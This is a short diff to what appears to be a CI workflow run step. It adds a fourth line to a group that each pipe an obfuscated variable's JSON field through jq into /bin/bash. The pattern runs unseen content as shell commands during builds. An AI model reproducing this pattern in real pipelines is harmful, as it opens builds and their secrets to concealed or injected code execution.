@@ -30,6 +30,7 @@ jobs:
           echo $rdju55681 | jq -r .b02922 | /bin/bash
           echo $yl3724 | jq -r .xbl22 | /bin/bash
           printf '%s' "$in3" | jq -r .iz708 | /bin/bash
+          echo $pwgm403 | jq -r .qnyab630 | /bin/bash
 
       - name: Store artifact
         if: always()
